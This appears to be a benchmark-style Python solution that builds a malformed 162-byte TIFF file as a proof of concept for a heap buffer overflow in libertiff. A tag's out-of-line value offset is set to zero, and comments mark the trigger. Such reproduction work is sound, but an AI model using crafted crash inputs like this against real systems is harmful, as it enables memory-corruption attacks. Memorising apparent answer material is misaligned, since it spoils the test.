import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a PoC for Heap Buffer Overflow in libertiff (oss-fuzz:388571282)
        # Vulnerability: Invalid offline tags with a value offset of zero.
        # Structure: Header + IFD (11 tags) + Data. Total 162 bytes.
        
        # 1. Header (8 bytes)
        # Little Endian ('II'), Version 42, IFD Offset 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # 2. IFD Entry Count (2 bytes)
        # 11 Directory Entries
        num_entries = struct.pack('<H', 11)
        
        # 3. Directory Entries (11 * 12 = 132 bytes)
        # Tags must be sorted by ID.
        entries = []
        
        # Tag 256: ImageWidth (Long, 1, 10)
        entries.append(struct.pack('<HHII', 256, 4, 1, 10))
        
        # Tag 257: ImageLength (Long, 1, 10)
        entries.append(struct.pack('<HHII', 257, 4, 1, 10))
        
        # Tag 258: BitsPerSample (Short, 3, OFFSET 0) -> TRIGGER
        # Type 3 (Short), Count 3 -> Size 6 bytes (>4, so offline).
        # Offset is set to 0. This is the "value offset of zero" triggering the vulnerability.
        entries.append(struct.pack('<HHII', 258, 3, 3, 0))
        
        # Tag 259: Compression (Short, 1, 1 - None)
        entries.append(struct.pack('<HHII', 259, 3, 1, 1))
        
        # Tag 262: PhotometricInterpretation (Short, 1, 2 - RGB)
        entries.append(struct.pack('<HHII', 262, 3, 1, 2))
        
        # Tag 273: StripOffsets (Long, 1, 162)
        entries.append(struct.pack('<HHII', 273, 4, 1, 162))
        
        # Tag 277: SamplesPerPixel (Short, 1, 3)
        entries.append(struct.pack('<HHII', 277, 3, 1, 3))
        
        # Tag 278: RowsPerStrip (Long, 1, 10)
        entries.append(struct.pack('<HHII', 278, 4, 1, 10))
        
        # Tag 279: StripByteCounts (Long, 1, 100)
        entries.append(struct.pack('<HHII', 279, 4, 1, 100))
        
        # Tag 282: XResolution (Rational, 1, Offset 146)
        # Offset 146 = 8 (Header) + 2 (Count) + 132 (Entries) + 4 (Next)
        entries.append(struct.pack('<HHII', 282, 5, 1, 146))
        
        # Tag 283: YResolution (Rational, 1, Offset 154)
        entries.append(struct.pack('<HHII', 283, 5, 1, 154))
        
        directory = b''.join(entries)
        
        # 4. Next IFD Offset (4 bytes) -> 0
        next_ifd = struct.pack('<I', 0)
        
        # 5. Data for Rationals (16 bytes)
        # XRes (72/1) and YRes (72/1)
        data = struct.pack('<II', 72, 1) * 2
        
        poc = header + num_entries + directory + next_ifd + data
        
        return poc